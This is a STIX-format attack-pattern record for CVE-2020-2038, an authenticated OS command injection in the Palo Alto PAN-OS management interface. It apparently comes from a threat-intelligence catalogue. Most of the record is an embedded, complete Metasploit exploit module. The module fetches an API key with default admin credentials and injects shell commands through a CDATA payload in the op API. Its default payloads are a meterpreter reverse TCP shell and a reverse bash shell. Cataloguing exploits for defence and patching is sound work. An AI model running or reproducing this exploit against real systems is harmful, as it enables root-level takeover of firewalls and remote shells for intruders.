{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be236e74-2c7b-4f3b-b940-960df4da063a",
    "created": "2024-08-14T17:02:23.991575Z",
    "modified": "2024-08-14T17:02:23.991579Z",
    "name": "Palo Alto Networks Authenticated Remote Code Execution",
    "description": " An OS Command Injection vulnerability in the PAN-OS management interface that allows authenticated administrators to execute arbitrary OS commands with root privileges. This issue impacts PAN-OS versions < 10.0.1, < 9.1.4 and < 9.0.10 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/panos_op_cmd_exec.rb",
            "external_id": "panos_op_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-2038"
        },
        {
            "source_name": "reference",
            "url": "https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "https://security.paloaltonetworks.com/CVE-2020-2038"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/und3sc0n0c1d0/CVE-2020-2038#Exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  require 'ipaddr'\n\n  class InvalidRequest < StandardError\n  end\n\n  class InvalidResponse < StandardError\n  end\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Palo Alto Networks Authenticated Remote Code Execution',\n        'Description' => %q{\n          An OS Command Injection vulnerability in the PAN-OS management interface that allows authenticated\n          administrators to execute arbitrary OS commands with root privileges.\n          This issue impacts PAN-OS versions < 10.0.1, < 9.1.4 and < 9.0.10\n        },\n        'Author' => [\n          'Mikhail Klyuchnikov', # Vulnerability discovery\n          'Nikita Abramov', # Vulnerability discovery\n          'UnD3sc0n0c1d0', # Exploit\n          'jheysel-r7' # msf module\n        ],\n        'References' => [\n          ['CVE', '2020-2038'],\n          ['URL', 'https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/'],\n          ['URL', 'https://security.paloaltonetworks.com/CVE-2020-2038'],\n          ['URL', 'https://github.com/und3sc0n0c1d0/CVE-2020-2038'] # Exploit\n        ],\n        'DisclosureDate' => '2020-09-09',\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Linux ',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'CmdStagerFlavor' => %i[echo printf],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix In-Memory',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'PAN-OS administrator username', 'admin']),\n        OptString.new('PASSWORD', [false, 'Password for username', 'admin'])\n      ]\n    )\n  end\n\n  def check\n    print_status('Authenticating...')\n    begin\n      @api_key = api_key\n    rescue InvalidRequest, InvalidResponse => e\n      return Exploit::CheckCode::Safe(\"Error retrieving API key: #{e.class}, #{e}\")\n    end\n    res = send_request_cgi({\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'api/'),\n      'vars_get' => {\n        'type' => 'version',\n        'key' => @api_key\n      }\n    })\n\n    return CheckCode::Unknown('The API did not respond to the request for the version of PAN_OS') unless res&.body\n\n    version = Rex::Version.new(res.get_xml_document.xpath('/response/result/sw-version').text)\n\n    if version >= Rex::Version.new('9.0.0') && version < Rex::Version.new('9.0.10') ||\n       version >= Rex::Version.new('9.1.0') && version < Rex::Version.new('9.1.4') ||\n       version >= Rex::Version.new('10.0.0') && version < Rex::Version.new('10.0.1')\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def api_key\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api/'),\n      'vars_get' => {\n        'type' => 'keygen',\n        'user' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n\n    if res.nil?\n      raise InvalidRequest, 'Unreachable'\n    end\n\n    if res.code == 401\n      raise InvalidRequest, 'Server returned HTTP status 401 - Authentication failed'\n    end\n\n    if res.code == 403\n      raise InvalidRequest, 'Server returned HTTP status 403 - Authentication failed with \"Invalid Credentials\"'\n    end\n\n    if res.body.blank?\n      raise InvalidResponse, 'Empty reply from server'\n    end\n\n    key = res.get_xml_document.xpath('/response/result/key')&.text\n\n    if key.nil?\n      raise InvalidResponse, 'Empty reply from server'\n    end\n\n    print_good('Successfully obtained api key')\n\n    key\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = \"<cms-ping><host>#{IPAddr.new(rand(2**32), Socket::AF_INET)}</host><count>#{rand(1..50)}</count><pattern>111<![CDATA[||#{cmd}||]]></pattern></cms-ping>\"\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api/'),\n      'vars_get' => {\n        'cmd' => payload,\n        'type' => 'op',\n        'key' => @api_key\n      }\n    })\n  end\n\n  def exploit\n    begin\n      @api_key ||= api_key\n    rescue InvalidRequest, InvalidResponse => e\n      fail_with(Failure::UnexpectedReply, \"Error retrieving API key: #{e}\")\n    end\n    print_status('Exploiting...')\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-09-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}